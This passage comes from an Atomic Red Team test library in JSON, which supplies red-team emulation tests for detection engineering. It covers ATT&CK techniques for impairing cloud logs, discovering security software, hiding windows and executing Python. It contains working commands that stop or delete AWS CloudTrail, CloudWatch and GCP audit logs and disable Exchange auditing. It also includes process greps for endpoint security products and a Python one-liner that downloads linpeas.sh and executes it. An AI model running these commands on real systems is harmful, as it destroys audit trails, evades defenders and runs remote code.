exit 1; fi;\n", "get_prereq_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"\nterraform init\nterraform apply -auto-approve\n"}], "executor": {"command": "aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}\naws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}\naws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}\n", "cleanup_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-1/\"\nterraform destroy -auto-approve\n", "name": "sh", "elevation_required": false}}, {"name": "Azure - Eventhub Deletion", "auto_generated_guid": "5e09bed0-7d33-453b-9bf3-caea32bff719", "description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n", "supported_platforms": ["iaas:azure"], "input_arguments": {"username": {"description": "Azure username", "type": "string", "default": null}, "password": {"description": "Azure password", "type": "string", "default": null}, "event_hub_name": {"description": "Name of the eventhub", "type": "string", "default": "test_eventhub"}, "resource_group": {"description": "Name of the resource group", "type": "string", "default": null}, "name_space_name": {"description": "Name of the NameSpace", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Install-Module -Name Az\n", "prereq_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n", "get_prereq_command": "Install-Module -Name AzureAD -Force\n"}, {"description": "Check if terraform is installed.\n", "prereq_command": "terraform version\n", "get_prereq_command": "echo Please install the terraform.\n"}, {"description": "Check if the user is logged into Azure.\n", "prereq_command": "az account show\n", "get_prereq_command": "echo Configure your Azure account using: az login. \n"}, {"description": "Create dependency resources using terraform\n", "prereq_command": "try {if (Test-Path \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/terraform.tfstate\" ){ exit 0 } else {exit 1}} catch {exit 1}\n", "get_prereq_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/\"\nterraform init\nterraform apply -auto-approve\n"}], "executor": {"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-AzureAD -Credential $creds\nRemove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}\n", "name": "powershell", "elevation_required": false, "cleanup_command": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/\"\nterraform destroy -auto-approve\n"}}, {"name": "Office 365 - Exchange Audit Log Disabled", "auto_generated_guid": "1ee572f3-056c-4632-a7fc-7e7c42b1543c", "description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n", "supported_platforms": ["office-365"], "input_arguments": {"username": {"description": "office-365 username", "type": "string", "default": null}, "password": {"description": "office-365 password", "type": "string", "default": null}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ExchangeOnlineManagement PowerShell module must be installed\n", "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n", "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"}], "executor": {"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False\n", "cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True\n", "name": "powershell", "elevation_required": false}}, {"name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus", "auto_generated_guid": "a27418de-bdce-4ebd-b655-38f11142bf0c", "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n", "supported_platforms": ["linux", "macos", "iaas:aws"], "input_arguments": {"stratus_path": {"description": "Path of stratus binary", "type": "path", "default": "$PathToAtomicsFolder/T1562.008/src"}, "aws_region": {"description": "AWS region to detonate", "type": "string", "default": "us-west-2"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n", "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"}, {"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n", "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n", "name": "sh", "elevation_required": false}}, {"name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus", "auto_generated_guid": "22d89a2f-d475-4895-b2d4-68626d49c029", "description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"stratus_path": {"description": "Path of stratus binary", "type": "path", "default": "$PathToAtomicsFolder/T1562.008/src"}, "aws_region": {"description": "AWS region to detonate", "type": "string", "default": "us-west-2"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n", "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"}, {"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n", "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n", "name": "sh", "elevation_required": false}}, {"name": "AWS - Remove VPC Flow Logs using Stratus", "auto_generated_guid": "93c150f5-ad7b-4ee3-8992-df06dec2ac79", "description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n", "supported_platforms": ["linux", "macos", "iaas:aws"], "input_arguments": {"stratus_path": {"description": "Path of stratus binary", "type": "path", "default": "$PathToAtomicsFolder/T1562.008/src"}, "aws_region": {"description": "AWS region to detonate", "type": "string", "default": "us-west-2"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n", "prereq_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"}, {"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force\n", "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n", "name": "sh", "elevation_required": false}}, {"name": "AWS - CloudWatch Log Group Deletes", "auto_generated_guid": "89422c87-b57b-4a04-a8ca-802bb9d06121", "description": "Creates a new cloudWatch log group in AWS, Upon successful creation it will Delete the group. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-group-deletion.html#aws-cloudwatch-log-group-deletion\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"cloudwatch_log_group_name": {"description": "Name of the cloudWatch log group", "type": "string", "default": "log-test"}, "region": {"description": "Name of the region", "type": "string", "default": "us-east-1"}}, "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "cleanup_command": null, "name": "sh", "elevation_required": false}}, {"name": "AWS CloudWatch Log Stream Deletes", "auto_generated_guid": "33ca84bc-4259-4943-bd36-4655dc420932", "description": "Creates a new cloudWatch log stream in AWS, Upon successful creation it will Delete the stream. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-stream-deletion.html\n", "supported_platforms": ["iaas:aws"], "input_arguments": {"cloudwatch_log_group_name": {"description": "Name of the cloudWatch log group", "type": "string", "default": "test-logs"}, "cloudwatch_log_stream_name": {"description": "Name of the cloudWatch log stream", "type": "string", "default": "20150601"}, "region": {"description": "Name of the region", "type": "string", "default": "us-west-2"}}, "dependencies": [{"description": "Check if ~/.aws/credentials file has a default stanza is configured\n", "prereq_command": "cat ~/.aws/credentials | grep \"default\"\n", "get_prereq_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"}], "executor": {"command": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Created ***\"\naws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Deleted ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "cleanup_command": null, "name": "sh", "elevation_required": false}}, {"name": "Office 365 - Set Audit Bypass For a Mailbox", "auto_generated_guid": "c9a2f6fe-7197-488c-af6d-10c782121ca6", "description": "Use Exchange Management Shell to Mailbox auditing to bypass. It will prevent any mailbox audit logging entries being generated for the target e-mail box.\nhttps://learn.microsoft.com/en-us/powershell/module/exchange/set-mailboxauditbypassassociation?view=exchange-ps\n", "supported_platforms": ["office-365"], "input_arguments": {"username": {"description": "office-365 username", "type": "string", "default": "o365_user_test"}, "password": {"description": "office-365 password", "type": "string", "default": "o365_password_test"}, "target_email": {"description": "office-365 target_email", "type": "string", "default": "o365_email_test"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "ExchangeOnlineManagement PowerShell module must be installed\n", "prereq_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n", "get_prereq_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"}], "executor": {"command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"#{target_email}\" -AuditBypassEnabled $true\n", "cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-MailboxAuditBypassAssociation -Identity \"#{target_email}\" -AuditBypassEnabled $false\nDisconnect-ExchangeOnline -Confirm:$false\n", "name": "powershell", "elevation_required": false}}, {"name": "GCP - Delete Activity Event Log", "auto_generated_guid": "d56152ec-01d9-42a2-877c-aac1f6ebe8e6", "description": "GCP provides 4 types of Cloud Audit Logs: Admin Activity, Data Access, System Events, and Policy Denied.\nAn adversary may attempt to delete logs in order to hide their activity. However, Admin Activity, System Events, and Policy Deny events logs cannot be deleted. \n\nThis Atomic attempts to delete the Activity Event log. An event is generated under the method name of `google.logging.v2.LoggingServiceV2.DeleteLog` with a Serverity of `ERROR`.\n", "supported_platforms": ["iaas:gcp"], "input_arguments": {"project-id": {"description": "ID of the GCP Project you to execute the command against.", "type": "string", "default": "atomic-project-1"}}, "executor": {"name": "sh", "elevation_required": false, "command": "gcloud config set project #{project-id}\ngcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2Factivity --quiet\n"}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires gcloud\n", "prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"}, {"description": "Check if user is logged in \n", "prereq_command": "gcloud config get-value account\n", "get_prereq_command": "gcloud auth login --no-launch-browser\n"}]}]}, "T1518.001": {"name": "Security Software Discovery", "technique_id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384", "external_id": "T1518.001", "data_components": ["Firewall Metadata", "OS API Execution", "Command Execution", "Process Creation", "Firewall Enumeration"], "kill_chain_phases": ["discovery"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS) For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the <code>DescribeSecurityGroups</code> action with various request parameters. (Citation: DescribeSecurityGroups - Amazon Elastic Compute Cloud)", "atomic_tests": [{"name": "Security Software Discovery", "auto_generated_guid": "f92a380f-ced9-491f-b338-95a991418ce2", "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, the test is going to display running processes, firewall configuration on network profiles\nand specific security software.\n", "supported_platforms": ["windows"], "executor": {"command": "netsh.exe advfirewall  show allprofiles \nnetsh.exe advfirewall firewall dump\nnetsh.exe advfirewall show currentprofile\nnetsh.exe advfirewall firewall show rule name=all\nnetsh.exe firewall show state\nnetsh.exe firewall show config\nsc query windefend\npowershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\"\npowershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\"\npowershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\"\ntasklist.exe\ntasklist.exe | findstr /i virus\ntasklist.exe | findstr /i cb\ntasklist.exe | findstr /i defender\ntasklist.exe | findstr /i cylance\ntasklist.exe | findstr /i mc\ntasklist.exe | findstr /i \"virus cb defender cylance mc\"\n", "name": "command_prompt"}}, {"name": "Security Software Discovery - powershell", "auto_generated_guid": "7f566051-f033-49fb-89de-b6bacab730f0", "description": "Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like \"*\"} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like \"*\"},\nif you know the name of those processes.\n", "supported_platforms": ["windows"], "executor": {"command": "get-process | ?{$_.Description -like \"*virus*\"}\nget-process | ?{$_.Description -like \"*carbonblack*\"}\nget-process | ?{$_.Description -like \"*defender*\"}\nget-process | ?{$_.Description -like \"*cylance*\"}\nget-process | ?{$_.Description -like \"*mc*\"}\nget-process | ?{$_.ProcessName -like \"*mc*\"}\nget-process | Where-Object { $_.ProcessName -eq \"Sysmon\" }\n", "name": "powershell"}}, {"name": "Security Software Discovery - ps (macOS)", "auto_generated_guid": "ba62ce11-e820-485f-9c17-6f3c857cd840", "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n", "supported_platforms": ["macos"], "executor": {"command": "ps aux | egrep 'Little\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\n", "name": "sh"}}, {"name": "Security Software Discovery - ps (Linux)", "auto_generated_guid": "23b91cd2-c99c-4002-9e41-317c63e024a2", "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell  is going to display AV/Security software it is running.\n", "supported_platforms": ["linux"], "executor": {"command": "ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'\n", "name": "sh"}}, {"name": "Security Software Discovery - pgrep (FreeBSD)", "auto_generated_guid": "fa96c21c-5fd6-4428-aa28-51a2fbecdbdc", "description": "Methods to identify Security Software on an endpoint\nwhen sucessfully executed, command shell is going to display AV/Security software it is running.\n", "supported_platforms": ["linux"], "executor": {"command": "pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\n", "name": "sh"}}, {"name": "Security Software Discovery - Sysmon Service", "auto_generated_guid": "fe613cf3-8009-4446-9a0f-bc78a15b66c9", "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n", "supported_platforms": ["windows"], "executor": {"command": "fltmc.exe | findstr.exe 385201\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Security Software Discovery - AV Discovery via WMI", "auto_generated_guid": "1553252f-14ea-4d3b-8a08-d7a4211aa945", "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n", "supported_platforms": ["windows"], "executor": {"command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List", "name": "command_prompt", "elevation_required": true}}, {"name": "Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets", "auto_generated_guid": "015cd268-996e-4c32-8347-94c80c6286ee", "description": "Discovery of installed antivirus products via Get-CimInstance and Get-WmiObject cmdlets of powershell.\n\nwhen sucessfully executed, information about installed AV software is displayed..\n", "supported_platforms": ["windows"], "executor": {"command": "powershell Get-CimInstance -Namespace root/securityCenter2 -classname antivirusproduct\npowershell Get-WmiObject -Namespace root\\securitycenter2 -Class antivirusproduct\n", "name": "command_prompt", "elevation_required": true}}, {"name": "Security Software Discovery - Windows Defender Enumeration", "auto_generated_guid": "d3415a0e-66ef-429b-acf4-a768876954f6", "description": "Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-Service WinDefend #check the service state of Windows Defender\nGet-MpComputerStatus #provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc\nGet-MpThreat #threats details that have been detected using MS Defender\n", "name": "powershell", "elevation_required": true}}, {"name": "Security Software Discovery - Windows Firewall Enumeration", "auto_generated_guid": "9dca5a1d-f78c-4a8d-accb-d6de67cfed6b", "description": "Enumerates windows firewall to retrieves firewall rules from the target computer.\n\nwhen sucessfully executed, details of windows firewall is displayed.\n", "supported_platforms": ["windows"], "executor": {"command": "Get-NetFirewallProfile | Format-Table Name, Enabled\nGet-NetFirewallSetting\nGet-NetFirewallRule | select DisplayName, Enabled, Description\n", "name": "powershell", "elevation_required": true}}]}, "T1564.003": {"name": "Hidden Window", "technique_id": "attack-pattern--cbb66055-0325-4111-aca0-40547b6ad5b0", "external_id": "T1564.003", "data_components": ["File Modification", "Script Execution", "Process Creation", "Command Execution"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db"], "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)", "atomic_tests": [{"name": "Hidden Window", "auto_generated_guid": "f151ee37-9e2b-47e6-80e4-550b9f999b7a", "description": "Launch PowerShell with the \"-WindowStyle Hidden\" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.\nUpon execution a hidden PowerShell window will launch calc.exe\n", "supported_platforms": ["windows"], "input_arguments": {"powershell_command": {"description": "Command to launch calc.exe from a hidden PowerShell Window", "type": "string", "default": "powershell.exe -WindowStyle hidden calc.exe"}}, "executor": {"command": "Start-Process #{powershell_command}\n", "name": "powershell"}}, {"name": "Headless Browser Accessing Mockbin", "auto_generated_guid": "0ad9ab92-c48c-4f08-9b20-9633277c4646", "description": "The following Atomic Red Team test leverages the Chrome headless browser to access a mockbin site. Create your own Mockbin.org site and replace the BIN in the inputs.\nThe default Mockbin ID forwards to google.com and you may view the details here https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec/view.\nReference: https://cert.gov.ua/article/5702579\n", "supported_platforms": ["windows"], "input_arguments": {"bin_id": {"description": "Mockbin.org BIN ID", "type": "string", "default": "f6b9a876-a826-4ac0-83b8-639d6ad516ec"}, "browser": {"description": "Browser to use (msedge, chrome, firefox)", "type": "string", "default": "chrome"}}, "executor": {"command": "start \"\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\n", "cleanup_command": "taskkill /im #{browser} /f\n", "name": "command_prompt"}}]}, "T1059.006": {"name": "Python", "technique_id": "attack-pattern--cc3502b5-30cc-4473-ad48-42d51a6ef6d1", "external_id": "T1059.006", "data_components": ["Process Creation", "Command Execution"], "kill_chain_phases": ["execution"], "data_source_platforms": [], "mitigations": ["course-of-action--23843cff-f7b9-4659-a7b7-713ef347f547", "course-of-action--47e0e9fe-96ce-4f65-8bb1-8be1feacb5db", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9", "course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8"], "description": "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.", "atomic_tests": [{"name": "Execute shell script via python's command mode arguement", "auto_generated_guid": "3a95cdb2-c6ea-4761-b24e-02b71889b8bb", "description": "Download and execute shell script and write to file then execute locally using Python -c (command mode)", "supported_platforms": ["linux"], "input_arguments": {"script_url": {"description": "Shell script public URL", "type": "string", "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"}, "payload_file_name": {"description": "Name of shell script downloaded from the script_url", "type": "string", "default": "T1059.006-payload"}, "executor": {"description": "FreeBSD or Linux shell", "type": "string", "default": "sh"}, "script_args": {"description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.", "type": "string", "default": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "Verify if python is in the environment variable path and attempt to import requests library.", "prereq_command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2>/dev/null; echo $?\n", "get_prereq_command": "pip install requests\n"}], "executor": {"command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n", "name": "sh", "cleanup_command": "rm #{payload_file_name} \n"}}, {"name": "Execute Python via scripts", "auto_generated_guid": "6c4d1dcb-33c7-4c36-a8df-c6cfd0408be8", "description": "Create Python file (.py) that downloads and executes shell script via executor arguments", "supported_platforms": ["linux"], "input_arguments": {"python_script_name": {"description": "Python script name", "type": "path", "default": "T1059.006.py"}, "script_url": {"description": "Shell script public URL", "type": "string", "default": "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"}, 